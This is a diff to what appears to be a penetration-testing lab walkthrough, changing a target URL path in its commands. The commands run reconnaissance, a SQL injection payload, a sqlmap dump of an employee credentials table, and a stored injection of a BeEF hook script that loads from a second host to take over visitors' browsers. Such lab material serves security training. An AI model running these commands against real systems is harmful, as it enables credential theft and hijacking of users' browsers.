@@ -35,10 +35,10 @@ nmap -sV -sC 172.16.0.100
 gobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt
 
 # Test SQLi (visit in browser or curl)
-http://172.16.0.100/employee-directory/?search=' OR '1'='1
+http://172.16.0.100/employees/?search=' OR '1'='1
 
 # Dump credentials with sqlmap
-sqlmap -u "http://172.16.0.100/employee-directory/?search=test" \
+sqlmap -u "http://172.16.0.100/employees/?search=test" \
   -D wordpress -T wp_acme_employees --dump --batch
 ```
 
@@ -77,7 +77,7 @@ beef-xss
 # Console: http://127.0.0.1:3000/ui/panel (beef/beef)
 
 # Inject hook via SQLi
-sqlmap -u "http://172.16.0.100/employee-directory/?search=test" \
+sqlmap -u "http://172.16.0.100/employees/?search=test" \
   --sql-query="UPDATE wp_acme_employees SET notes='<script src=\"http://172.16.0.10:3000/hook.js\"></script>' WHERE employee_id='EMP001'"
 ```
 Wait for victim browser to appear in BeEF console.
